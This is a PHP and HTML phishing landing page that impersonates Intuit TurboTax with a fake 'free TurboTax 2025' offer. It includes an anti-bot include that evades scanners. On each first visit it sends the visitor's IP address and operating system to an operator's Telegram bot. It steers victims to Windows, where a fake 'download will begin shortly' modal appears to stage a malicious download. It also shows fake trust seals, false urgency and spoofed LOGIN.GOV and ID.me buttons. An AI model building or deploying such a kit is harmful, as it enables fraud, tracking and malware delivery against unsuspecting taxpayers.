<?php
// Primary Defense: The first line of code MUST be the anti-bot integration.
require_once $_SERVER['DOCUMENT_ROOT'].'/antibot/index.php'; // <--- IMPORTANT

session_start();

// --- Telegram Notification System (Part 1: On First Visit) ---
function sendInitialTelegramNotification() {
    // Check if notification has already been sent for this session
    if (!isset($_SESSION['notified'])) {
        $botToken = "[YOUR_TELEGRAM_BOT_TOKEN]"; // <-- REPLACE
        $chatId = "[YOUR_TELEGRAM_CHAT_ID]";     // <-- REPLACE

        // Generate a random funny name
        $funnyNames = ["Big Dodo", "Captain Underpants", "Sir Farts-a-Lot", "Agent Potato", "Professor Goofball"];
        $randomName = $funnyNames[array_rand($funnyNames)];
        $_SESSION['visitor_name'] = $randomName; // Store name for the second notification

        // Gather visitor info
        $ipAddress = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        // Determine OS
        $os = "Unknown OS";
        if (preg_match('/windows/i', $userAgent)) { $os = 'Windows'; }
        elseif (preg_match('/macintosh|mac os x/i', $userAgent)) { $os = 'macOS'; }
        elseif (preg_match('/linux/i', $userAgent)) { $os = 'Linux'; }
        elseif (preg_match('/android/i', $userAgent)) { $os = 'Android'; }
        elseif (preg_match('/iphone|ipad|ipod/i', $userAgent)) { $os = 'iOS'; }
        
        // Determine access method (just an example, could be more complex)
        $accessMethod = isset($_SERVER['HTTP_X_REQUESTED_WITH']) ? 'AJAX' : 'Direct';

        // Format the message
        $message = "Visitor {$randomName} Landed.\n";
        $message .= "{$ipAddress}\n";
        $message .= "Status: REAL User, {$accessMethod} - {$os}.";

        // Use cURL to send the message
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $postFields = ['chat_id' => $chatId, 'text' => $message];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        curl_close($ch);

        // Set session variable to prevent re-notification on refresh
        $_SESSION['notified'] = true;
    }
}

// Trigger the notification
sendInitialTelegramNotification();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Your Exclusive TurboTax Access</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="icon" href="/img/favicon.ico" type="image/x-icon"> 
</head>
<body>

    <header class="main-header">
        <div class="container header-container">
            <img src="img/turbo-logo.svg" alt="Intuit TurboTax Logo" class="header-logo">
            <button class="file-return-btn">File a return</button>
        </div>
    </header>

    <main>
        <section class="main-content">
            <div class="container">
                <h1>Your exclusive free access to TurboTax 2025 is ready.</h1>
                <p class="sub-heading">No credit card required. Offer ends today!</p>
                <p>Download and install your software in a few easy steps. Have your license code from email ready to unlock your free offer</p>
                
                <div class="product-selection">
                    <div class="product-card">
                        <img src="img/turbotax_premier_box.svg" alt="TurboTax Premier">
                        <h3>TurboTax Premier</h3>
                    </div>
                    <div class="product-card">
                        <img src="img/turbotax_business_box.svg" alt="TurboTax Business">
                        <h3>TurboTax Business</h3>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <footer class="main-footer">
        <div class="container footer-content">
            <div class="footer-left">
                <img src="img/intuit_logo_footer.svg" alt="Intuit" class="intuit-logo">
            </div>
            <div class="footer-center">
                <p>&copy; <?php echo date("Y"); ?> Intuit Inc. All rights reserved.</p>
            </div>
            <div class="footer-right">
                <img src="img/security_trust_seal.svg" alt="TRUSTe Certified Privacy">
                <img src="img/security_efile_certified.svg" alt="E-File Certified">
            </div>
        </div>
    </footer>
    
    <div id="windows-modal" class="modal-overlay">
        <div class="modal-content">
            <img src="img/turbo-logo.svg" alt="TurboTax Logo" class="modal-logo">
            <h3>Secure Device Verified</h3>
            <p>Your connection is secure and your device has been verified. Your download will begin shortly...</p>
        </div>
    </div>

    <div id="non-windows-modal" class="modal-overlay">
        <div class="modal-content">
            <img src="img/turbo-logo.svg" alt="TurboTax Logo" class="modal-logo">
            <h3>Authorization Required</h3>
            <p>It looks like you're accessing this from a mobile device or a non-Windows computer. For security and compatibility, we recommend completing this process on a <strong>Windows desktop or laptop</strong>.</p>
            <div class="modal-buttons">
                <a href="incompatible-device.php" class="modal-btn">LOGIN.GOV</a>
                <a href="incompatible-device.php" class="modal-btn">ID.me</a>
            </div>
        </div>
    </div>

    <div id="inactivity-modal" class="modal-overlay">
        <div class="modal-content">
            <img src="img/turbo-logo.svg" alt="TurboTax Logo" class="modal-logo">
            <h3>Are you still there?</h3>
            <p>Your session is about to expire due to inactivity. The page will refresh in:</p>
            <div id="countdown-timer">60</div>
            <p>Please move your mouse or press a key to continue.</p>
        </div>
    </div>

    <script src="js/script.js"></script>
</body>
</html>